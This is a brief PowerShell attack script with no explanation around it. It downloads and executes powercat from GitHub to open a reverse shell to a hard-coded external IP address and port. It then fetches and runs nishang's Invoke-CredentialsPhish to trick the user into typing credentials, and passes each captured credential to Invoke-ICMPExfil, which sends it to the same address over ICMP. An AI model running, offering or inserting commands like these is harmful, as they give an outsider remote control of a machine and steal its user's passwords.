$ip = 51.38.185.232
$port = 413

& {iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 | iex
powercat -c 51.38.185.232 -p 413 -ep }

iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
Invoke-CredentialsPhish | % { 1..10 | % { Invoke-ICMPExfil -Target $ip -Payload $_ -Verbose } }

